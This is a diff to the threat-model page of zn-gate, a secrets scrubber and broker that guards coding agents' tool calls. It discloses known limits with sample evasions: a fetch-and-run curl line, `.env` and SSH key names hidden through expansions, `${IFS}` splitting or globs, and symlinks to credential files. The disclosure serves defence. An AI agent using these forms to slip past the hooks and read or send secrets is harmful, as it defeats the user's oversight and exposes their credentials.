@@ -1,8 +1,26 @@
-# Threat model: secrets scrubber and broker
+# Threat model: scrubber and broker
 
 **zn-gate keeps secret values out of the model's context. In env mode, a
 command you allowed still holds the value: scope it, and turn on your agent's
 sandbox.**
+
+## On this page
+
+- [What zn protects against](#what-zn-protects-against)
+- [What zn does not protect against](#what-zn-does-not-protect-against)
+- [Google Antigravity](#google-antigravity)
+- [GitHub Copilot (VS Code and Copilot CLI)](#github-copilot-vs-code-and-copilot-cli)
+- [Experimental adapters](#experimental-adapters)
+- [What the vault daemon protects, and what it does not](#what-the-vault-daemon-protects-and-what-it-does-not)
+- [Memory, swap and crash dumps](#memory-swap-and-crash-dumps)
+- [Starting the approved program](#starting-the-approved-program)
+- [Where the value lives while a program runs](#where-the-value-lives-while-a-program-runs)
+- [Local copies, per agent](#local-copies-per-agent)
+- [Confirmation channel](#confirmation-channel)
+- [The saved API key (`zn-gate connect`)](#the-saved-api-key-zn-gate-connect)
+- [Failure behaviour](#failure-behaviour)
+- [Design decisions and known limits](#design-decisions-and-known-limits)
+- [Next steps](#next-steps)
 
 ## What zn protects against
 
@@ -26,7 +44,7 @@ reads, command output, search results, MCP results and pasted prompts.
 | A secret written into a file by `secrets_render_file` outside the project, over an existing file, or into a credential file | **You are asked** | Only new files inside the project, other than credential files, are written without confirmation. The agents' hook and plugin settings and zn's own state are refused outright. An overwrite is done in place through the checked descriptor, so a power cut during it can leave a truncated file; a file with other hard links is refused |
 | The API reflects the token in its response | **Yes** | Responses are masked and scrubbed |
 | The vault file is forged with the public key, edited, or deleted | **Fails closed** | Integrity tag keyed by the identity; a missing vault with existing history is refused |
-| The audit log is cut or replaced while the vault is locked or running | **Detected** | The vault keeps the last record (sequence number and MAC) and compares the log with it before every write, and checks the whole chain (every signature) before it writes, shows, exports or uploads the log. A mismatch, including one changed record in the middle, leaves a warning inside the vault and the log is not shown, exported or uploaded; `zn vault verify` fails until you accept the log |
+| The vault audit log is cut or replaced while the vault is locked or running | **Detected** | The vault keeps the last record (sequence number and MAC) and compares the log with it before every write, and checks the whole chain (every signature) before it writes, shows, exports or uploads the log. A mismatch, including one changed record in the middle, leaves a warning inside the vault and the log is not shown, exported or uploaded; `zn vault verify` fails until you accept the log |
 
 ## What zn does not protect against
 
@@ -40,6 +58,7 @@ reads, command output, search results, MCP results and pasted prompts.
 | **Copies kept by the agent on your disk** | See below. |
 | **Restoring an old `secrets.age`, with or without its old `audit.jsonl`** | The log still verifies against the older checkpoint, so the check passes. Detecting it needs an anchor outside `~/.zn` (a Team upload of the log is one). |
 | **Records of the last minute if the vault process is killed** | The vault saves its checkpoint every minute and when it locks. Records written after the last save can be cut without notice if the process is killed before the next save. |
+| **A symbolic link or a Windows short name that points at a protected file** | The path checks read the text of a path; they do not look at the disk. A link such as `notes.txt` that points at `.env` or `~/.ssh/id_rsa`, or a short name such as `PROGRA~1`, is not recognised as the protected file. Keep secrets in the vault or outside the project folder. The coding-agent hooks of the npm package also resolve the real path of the agents' own configuration files. |
 
 zn-gate is not a sandbox, and how much it sees depends on the agent (see
 [compat.md](compat.md)). Hooks are a guardrail: a determined process can find another
@@ -74,6 +93,14 @@ a write the hooks cannot read as a word of the command (inline code, a path
 built at run time) is not seen, and an agent that cannot ask (see
 [compat.md](compat.md#agent-memory-and-instruction-files)) gets a block with the
 reason instead of a question. You can turn it off with `hooks.agentInstructionWrites`.
+
+- **Commands whose arguments are built when they run.** zn reads the command as it is written. An argument that a
+  program only gets when the command runs (the output of `$(...)` or backticks, `xargs`, `eval`, `bash -c` with built
+  text, shell functions, `read` or `printf -v` into a variable, arrays, `IFS` changes, `${var/x/y}` substitutions) is
+  not known to zn, for curl as for any other command. For curl, zn refuses the forms it cannot read (options read from
+  standard input or a pipe, a file to upload or to send with `@file` whose name is built at run time), but other programs and other ways to build arguments
+  can still name a protected file. Keep secrets out of plain-text files (`zn-gate env shadow .env`) so that there is
+  nothing to send.
 
 ## Google Antigravity
 
@@ -111,16 +138,10 @@ project). It adds a hook that runs before each tool call.
   The directories `~/.gemini` and `~/.gemini/antigravity-cli` are not
   protected either, only the files named above.
 
-## Experimental adapters
+## GitHub Copilot (VS Code and Copilot CLI)
 
-Some agents are supported through an adapter that is still experimental. It
-is built from the agent's public documentation and has not had the same
-end-to-end testing as the agents above, so read this section before relying on
-it. Each adapter lists its limits when you install it.
-
-### GitHub Copilot CLI
-
-Install it with `zn hooks install copilot` (add `--project` for one project).
+Evidence: documented for VS Code, tested end to end with Copilot CLI, not tested in
+the VS Code app. Install it with `zn hooks install copilot` (add `--project` for one project).
 It adds hooks that run before and after each tool call. zn writes its own
 `zn-gate.json` in `~/.copilot/hooks/` (or `$COPILOT_HOME/hooks/` when you set
 a custom Copilot folder) and, with `--project`, in `.github/hooks/`. It has
@@ -144,6 +165,13 @@ provider: 0 secret values sent.
   log (`events.jsonl`) keeps the original tool output on your machine.
   `disableAllHooks` in zn's file or in `.github/copilot/settings(.local).json`
   turns the hooks off; `zn-gate check` reports it.
+
+## Experimental adapters
+
+Some agents are supported through an adapter that is still experimental. It
+is built from the agent's public documentation and has not had the same
+end-to-end testing as the agents above, so read this section before relying on
+it. Each adapter lists its limits when you install it.
 
 ### Gemini CLI
 
@@ -211,7 +239,7 @@ prove it can read `~/.zn/run/session.key`.
     approved (the same file identity as the approval), the hosts and places
     (header, URL, body) the secret allows, and the organization policy.
   - A request that names no destination and no purpose, or one the daemon does
-    not know, gets nothing and is written to the audit log.
+    not know, gets nothing and is written to the vault audit log.
 - **The other commands that touch values are concrete.** `zn secret adopt`
   moves a value inside the vault. `zn secret import` and `zn env shadow` compare
   a value by getting yes or no (recorded, and limited to 120 a minute).
@@ -322,7 +350,7 @@ right before starting it, and starts that path; it never looks the name up on
   - **Your own script: allowed, with a warning.** Only you (and root or an
     administrator) can write it, as with scripts installed by nvm, Homebrew,
     pnpm, yarn, pipx or a virtual environment. `zn run` prints a one-line
-    warning on stderr and notes it in the audit log. The remaining risk: any
+    warning on stderr and notes it in the vault audit log. The remaining risk: any
     other program running as your user could still swap the script in that
     window. That is the same trust zn already places in everything that runs
     as you. To avoid it, run the script through its interpreter
@@ -430,6 +458,8 @@ stop malware running as the same user (see above).
 - **Optional cloud check unavailable** (no connection, timeout, a service error, or a
   saved key that cannot be read): the prompt is checked by the local rules alone
   and the result says `fallback: true`. This path does not fail closed.
+- **Optional cloud check answers with an unknown verdict** (neither allow nor block):
+  the text is blocked (rule `cloud:unknown-verdict`). This path fails closed.
 - **Vault locked:** the hooks still run the scrubber without it. They redact
   patterns, PII and values found in local files with irreversible markers. The
   broker refuses to fill any value.
@@ -548,5 +578,24 @@ stop malware running as the same user (see above).
   at a command (quotes, a backslash inside a word, `$'\x63url'`), but they do not
   follow a variable: `C=curl; $C https://example.com/i.sh | sh` is not seen. The
   rules are a guardrail against mistakes, not a sandbox.
+- **A protected name that no text spells is not read.** Each expansion in a command (`${NAME}`, `$NAME`, `$(...)`, backticks, cmd.exe
+  `%NAME%` and `!NAME!` units) is read as any text, whatever the environment the hook sees holds. A path segment is refused when it holds
+  such an expansion and at least two literal characters of `.env`, `.env.*` or an SSH private key name in the places they have in
+  that name: `.e${X}v`, `${D}env`, `.e$(echo n)v`, `.e%X:~0,1%v`. This also refuses a few ordinary names, such as `${PREFIX}env`,
+  and a segment that ends in `.example`, `.sample` or `.template` is allowed. An unquoted expansion can also split its value into
+  several words (`cat a${IFS}.env` reads `.env`), so each piece of a segment between unquoted expansions is checked as a word of its
+  own, and the `.example` ending only counts at the end of the last piece (`cat .e$(printf "nv ")v.example` is refused); inside double
+  quotes nothing is split. A piece is also read as a glob, because the shell globs each word after it splits (`cat a${IFS}.e*`, `.en?`, `.en[v]`
+  and `?env` are refused as pieces). This also refuses names that start with `id_` or end with a key type next to an unquoted
+  expansion, such as `~/.ssh/id_${T}.pub`, `id_${T}.txt` and `cp ${SRC}/id_${T}.pub`; quote the expansion or write the name out. It does not refuse a name that is wholly inside the
+  expansion: `cat ${NAME}` with `NAME=.env` set by an earlier command or by the agent's environment, `cat $(cat names.txt)`, or a
+  substitution that assembles the name from pieces without a literal character outside it. A variable assigned in the same line
+  (`NAME=.env; cat $NAME`) is followed, and so is a substitution that only prints a word (`$(echo .env)`). Other names (for
+  example `.npmrc` or a `.pem` file) are not part of this reading. The rules are a guardrail, not a sandbox.
 - **Latency:** each hook is a short Node process. Measured about 78 ms p50 per
   tool call on a Windows desktop (`bench/HOOK_LATENCY.md`).
+
+## Next steps
+
+- [Compatibility](compat.md): which agents and platforms zn works with, and how well.
+- [Architecture](architecture.md): how the hooks, scrubber and vault fit together behind these limits.
